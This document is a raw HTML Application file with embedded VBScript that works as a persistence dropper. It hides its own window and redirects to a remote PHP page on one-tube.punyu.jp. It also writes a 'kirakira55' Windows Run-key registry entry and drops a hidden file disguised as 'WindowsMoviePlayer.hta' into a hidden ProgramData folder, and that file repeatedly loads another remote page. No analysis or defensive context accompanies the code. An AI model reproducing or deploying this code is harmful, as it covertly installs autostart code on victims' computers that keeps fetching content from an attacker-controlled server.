<HTML>
<HEAD>
<meta http-equiv="Content-Type" content="text/html; charset=Shift_JIS">
<HTA:APPLICATION 
APPLICATIONNAME="feifa"
ID="kcxv"
VERSION="1.0"
SINGLEINSTANCE="yes"
SHOWINTASKBAR="no"
NAVIGABLE="no"
WINDOWSTATE="maximize"
BORDER="none"
INNERBORDER="no"
BORDERSTYLE="normal"
CONTEXTMENU="no"
SELECTION="no"
SCROLL="no"
SCROLLFLAT="no"
CAPTION="no"
ICON=""
SYSMENU="no"
MAXIMIZEBUTTON="no"
MINIMIZEBUTTON="no"
/>


<meta http-equiv="refresh" content="1;URL=http://one-tube.punyu.jp/include.php">



<SCRIPT Language="VBScript">
	Const myDir = "C:\ProgramData\"
	Const strUpFile = "WindowsMoviePlayer.hta"

	Dim FSO
	Dim str_path
	Dim oLog
	Dim ts
	Dim DistFile

	Set WshShell = CreateObject("WScript.Shell")
	On Error Resume Next
	IF (IsNull(WshShell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\kirakira55_already"))) Then

		DistFile = myDir & strUpFile

		WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\kirakira55", "mshta " & DistFile, "REG_SZ"

		Set FSO = CreateObject("Scripting.FileSystemObject")

		If FSO.FolderExists(myDIR) = True Then
		Else
			'CREATE FOLDER
			str_path = FSO.CreateFolder(myDIR)
			
			'CHANGE FOLDER STATUS to HIDDEN
			set folder = FSO.GetFolder(myDIR)
			folder.Attributes = folder.Attributes + 2
		End If


		if FSO.FileExists(DistFile) = True Then
			FSO.DeleteFile DistFile
		End If

		FSO.CreateTextFile DistFile
		Set oLog = FSO.GetFile(DistFile)
		oLog.Attributes = (oLog.Attributes Or 2)
		Set ts = oLog.OpenAsTextStream(2, -2)

		WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\kirakira55", "mshta " & DistFile, "REG_SZ"

		ts.Write("<HTML>")
		ts.Write("<HEAD>")
		ts.Write(vbNewLine)
		ts.Write("<meta http-equiv=""Content-Type"" content=""text/html; charset=Shift_JIS"">")
		ts.Write(vbNewLine)
		ts.Write("<HTA:APPLICATION")
		ts.Write(vbNewLine)
		ts.Write("APPLICATIONNAME=""feifa""")
		ts.Write(vbNewLine)
		ts.Write("ID=""kcxv""")
		ts.Write(vbNewLine)
		ts.Write("VERSION=""1.0""")
		ts.Write(vbNewLine)
		ts.Write("SINGLEINSTANCE=""yes""")
		ts.Write(vbNewLine)
		ts.Write("SHOWINTASKBAR=""no""")
		ts.Write(vbNewLine)
		ts.Write("NAVIGABLE=""no""")
		ts.Write(vbNewLine)
		ts.Write("WINDOWSTATE=""maximize""")
		ts.Write(vbNewLine)
		ts.Write("BORDER=""none""")
		ts.Write(vbNewLine)
		ts.Write("INNERBORDER=""no""")
		ts.Write(vbNewLine)
		ts.Write("BORDERSTYLE=""normal""")
		ts.Write(vbNewLine)
		ts.Write("CONTEXTMENU=""no""")
		ts.Write(vbNewLine)
		ts.Write("SELECTION=""no""")
		ts.Write(vbNewLine)
		ts.Write("SCROLL=""no""")
		ts.Write(vbNewLine)
		ts.Write("SCROLLFLAT=""no""")
		ts.Write(vbNewLine)
		ts.Write("CAPTION=""no""")
		ts.Write(vbNewLine)
		ts.Write("ICON=""""")
		ts.Write(vbNewLine)
		ts.Write("SYSMENU=""no""")
		ts.Write(vbNewLine)
		ts.Write("MAXIMIZEBUTTON=""no""")
		ts.Write(vbNewLine)
		ts.Write("MINIMIZEBUTTON=""no""")
		ts.Write(vbNewLine)
		ts.Write("/>")
		ts.Write(vbNewLine)
		ts.Write(vbNewLine)
		ts.Write("<meta http-equiv=""refresh"" content=""1;URL=http://one-tube.punyu.jp/include2.php"">")
		ts.Write(vbNewLine)
		ts.Write(vbNewLine)
		ts.Write(vbNewLine)
		ts.Write(vbNewLine)
		ts.Write("</body>")
		ts.Write(vbNewLine)
		ts.Write("</html>")

		ts.Close()
		Set ts = Nothing
		Set oLog = Nothing

		Set FSO = Nothing
	End If

	Set WshShell = Nothing

</SCRIPT> 



</body>
</html>
